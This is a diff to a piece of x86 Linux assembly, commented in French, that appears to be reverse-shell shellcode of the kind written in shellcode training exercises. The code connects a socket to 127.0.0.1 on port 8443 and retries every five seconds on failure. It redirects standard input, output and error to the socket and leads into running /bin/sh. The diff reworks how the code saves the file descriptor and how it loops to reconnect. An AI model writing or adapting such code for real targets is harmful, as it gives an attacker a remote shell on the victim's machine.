@@ -47,19 +47,23 @@ socket_creation:
 
 	int 0x80 		; interruption systeme
 
+
+	; file descriptor
+	xor edx, edx		; clean edx
+	mov edx, eax 		
+
 ; connexion du socket au système distant
 ; nous utiliserons la fonction SYS_CONNECT de l'appel système socketcall
 	
 socket_connection:
 	; file descriptor
-	xor edx, edx		; clean edx
-	mov edx, eax 		
+	; xor edx, edx		; clean edx
+	; mov edx, eax 		
 
 	mov al, SOCKET		; 0x66 = 102 pour le syscall socketcall
 
 	mov bl, 0x3		; argument à 3 pour appeler SYS_CONNECT
 
-stack_structure:
 	xor ecx, ecx		; clean ecx
 	push 0x0100007f		; donne l'adresse ip 127.0.0.1 à placer à l'envers 1.0.0.127
 	push word 0xfb20	; port 8443
@@ -72,7 +76,12 @@ stack_structure:
 	push edx		; file descriptor retour du syscall socket
 
 	mov ecx, esp
+
 	int 0x80
+
+	cmp eax, 0
+	jne sleep
+	jmp duplicate_file_descriptors
 
 	; sleep
 	; si le programme ne peut se connecter, attente de 5 secondes
@@ -81,12 +90,12 @@ stack_structure:
 	; si le syscall est interrompu par un signal handler
 	; struct timespec : tv_sec et tv_nsec
 
+	
 
-
-sleep:
+ sleep:
 	; push sur la stack pour conserver les valeurs de eax, ebx et ecx
 	; comme une mémoire tampon
-	push eax
+	push edx
 	push ebx
 	push ecx
 
@@ -97,11 +106,10 @@ sleep:
 	mov ecx, 0
 	int 0x80
 
-	cmp eax, 0 
-	jne stack_structure	; jmp if not equal 
 	pop ecx
 	pop ebx
-	pop eax
+	pop edx
+	jmp socket_connection
 
 ; redirigeons STDIN, STDOUT et STDERR vers le file descriptor socket precedemment créé
 ; 	
@@ -123,6 +131,7 @@ duplicate_file_descriptors:
 	mov al, 0x3f
 	mov cl, 0x2		; 0x2 = 2 car le file descriptor de STDERR est 2
 	int 0x80
+
 
 ; execution de /bin/sh
 execution_bin_sh:
